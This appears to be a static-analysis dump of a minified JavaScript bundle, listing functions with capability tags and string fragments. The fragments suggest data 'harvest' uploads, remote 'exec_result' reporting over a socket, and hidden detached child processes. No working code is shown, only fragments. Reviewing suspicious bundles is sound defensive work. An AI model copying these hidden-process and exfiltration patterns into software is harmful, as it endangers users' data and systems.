+yd@264296 1012B NET :: Initial backup waiting for manual resume... | function | Initial backup waiting for socket... | Initial backup waiting for pause clear... | Initial backup waiting for harvest/manual upload
+gd@265308 288B NET :: );try{if(Me&&typeof Me.emit=== | &&Me.connected){Me.emit( | ,{type: | ,action:String(t||
+wd@265596 350B NET :: function | exec_result | backup | status
+Sd@265946 420B  :: win32 | taskkill | /PID | ignore | SIGKILL
+bd@266366 1302B  :: main.js | Backup child: entry script not found: | ,VS_BACKUP_FORCE_RUN:r? | ,CLIENT_ID:String(m),CLIENT_USERNAME:String(So|| | )},detached:true,stdio: | ,windowsHide:true,shell:false});o.on( | ,t=>{try{console.error( | ,t?.message||t)}catch(t){}});o.on(
+vd@267998 401B NET :: data | ,function(){try{const t=Buffer.concat(n).toStrin | );e(_d(t)?t:null)}catch(t){e(null)}});t.on( | ,function(){e(null)})});n.on( | ,function(){e(null)});n.on(
+xd@268399 241B FS :: main.js | utf8 | )).toLowerCase()=== | &&e.existsSync(tf)){return e.readFileSync(tf, | )}}catch(t){}return
+jd@268640 227B FS :: utf8
+Pd@268900 586B FS :: );','const path = require( | +JSON.stringify(D)+ | if (!fs.existsSync(pendingPath)) { process.exit( | utf8 | try { fs.unlinkSync(pendingPath); } catch (_) {} | require | module | exports
+Dd@269486 341B FS :: utf8 | ignore
+Ad@269827 2402B NET,PROC,FS :: main.js | ;if(e.existsSync(o)){i=o}else if(String(n.basena | )).toLowerCase()=== | ;try{if(process.platform=== | ){const r=t=>String(t).replace(/ | ');const o=n.join(n.dirname(i), | );const s=process.env.WINDIR|| | ;const l=n.join(s,
